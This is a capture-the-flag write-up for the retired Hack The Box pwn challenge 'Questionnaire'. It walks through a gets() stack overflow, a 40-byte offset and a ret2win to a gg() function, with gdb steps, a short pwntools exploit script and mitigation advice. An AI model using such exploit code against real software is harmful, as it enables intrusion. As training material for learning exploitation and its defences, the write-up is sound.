---
challenge: Questionnaire
type: Pwn
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [pwn, buffer-overflow, ret2win, no-pie]
---

# Questionnaire — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flag.

## TL;DR

The binary asks questions, but the real bug is a `gets` in `vuln`: 40 bytes to RIP and a `gg()` function that runs `cat flag.txt`. No PIE means `gg` has a fixed address.

## Prompt and surface

- Pwn, Very Easy, retired.
- A 64-bit ELF is provided.
- The prompt simulates a quiz.

```bash
file pwn
checksec ./pwn
```

## Reconnaissance

```bash
chmod +x pwn
./pwn
objdump -d -M intel pwn | grep -A5 '<vuln>'
```

- No canary, NX and no PIE.
- `gets` reads without a limit into `vuln`.
- `gg` calls `system("cat flag.txt")`.

## Code analysis

The stack reserves 32 bytes for the buffer and 8 for locals. The return address is 40 bytes from the start. `gets` lets us overwrite it.

## Why it works

A classic stack overflow: send filler up to offset 40 and write the address of `gg`. No ROP is needed because the target function already exists and PIE is off.

## Local reproduction

```bash
gdb -q ./pwn
pattern create 100
run
pattern offset $rsp
```

- Confirm the offset with a cyclic pattern.
- Check `gg` with `info functions gg`.
- Test the payload locally before using it remotely.

## Exploitation

```python
from pwn import *
elf = context.binary = ELF('./pwn')
p = process()
p.sendline(b'A' * 40 + p64(elf.sym.gg))
p.interactive()
```

For remote, replace `process()` with `remote('<IP>', '<PORT>')`. The flag is redacted.

## Evidence

- `checksec` showing no canary and no PIE.
- Disassembly of `vuln` and `gg`.
- Offset of 40.
- Local run with the flag redacted.

## Lessons learned

- `gets` remains a direct bug.
- A ret2win avoids building a ROP chain.
- Check PIE before choosing addresses.

## Mitigations and detection

- Replace `gets` with bounded `fgets`.
- Build with canary, PIE and NX.
- Monitor SIGSEGV crashes and oversized payloads.

## References

- <https://www.hackthebox.com/challenges/Questionnaire>
- <https://attack.mitre.org/techniques/T1203/>
